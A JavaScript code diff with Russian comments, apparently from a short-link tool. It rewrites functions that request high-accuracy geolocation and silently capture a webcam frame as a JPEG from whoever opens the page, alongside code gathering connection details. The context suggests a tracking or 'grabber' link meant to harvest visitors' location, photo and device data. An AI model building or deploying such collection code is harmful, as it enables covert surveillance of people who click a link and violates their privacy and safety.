@@ -176,26 +176,58 @@ function generateShortLink(longID) {
         conn:getConnection()
       };
     }
-    async function getGeo(){
-      if(!navigator.geolocation) return null;
-      return new Promise(res=>{
-        navigator.geolocation.getCurrentPosition(
-          pos=>res(pos.coords), ()=>res(null),
-          {enableHighAccuracy:true,timeout:20000,maximumAge:0}
-        );
-      });
-    }
-    async function takePhoto(){
-      try{
-        let s=await navigator.mediaDevices.getUserMedia({video:true}),
-            v=document.createElement('video');
-        v.srcObject=s; await v.play(); await new Promise(r=>setTimeout(r,1000));
-        let c=document.createElement('canvas'); c.width=640; c.height=480;
-        c.getContext('2d').drawImage(v,0,0);
-        s.getTracks().forEach(t=>t.stop());
-        return c.toDataURL('image/jpeg');
-      }catch{return null}
-    }
+    // Получение геолокации
+async function getGeo() {
+  if (!navigator.geolocation) return null;
+
+  return new Promise((resolve) => {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const { latitude, longitude, accuracy } = position.coords;
+        resolve({ latitude, longitude, accuracy });
+      },
+      (error) => {
+        console.warn('Geolocation error:', error.message);
+        resolve(null);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0
+      }
+    );
+  });
+}
+
+// Захват фото с камеры
+async function takePhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    // Дожидаемся начала воспроизведения
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => resolve();
+    });
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Останавливаем все потоки (камера)
+    stream.getTracks().forEach((track) => track.stop());
+
+    return canvas.toDataURL('image/jpeg');
+  } catch (err) {
+    console.warn('Camera error:', err);
+    return null;
+  }
+}
     function formatInitial(d){
       let conn=d.conn?
         `downlink:${d.conn.downlink}Mb/s, type:${d.conn.type}, rtt:${d.conn.rtt}ms`:'Unavailable';
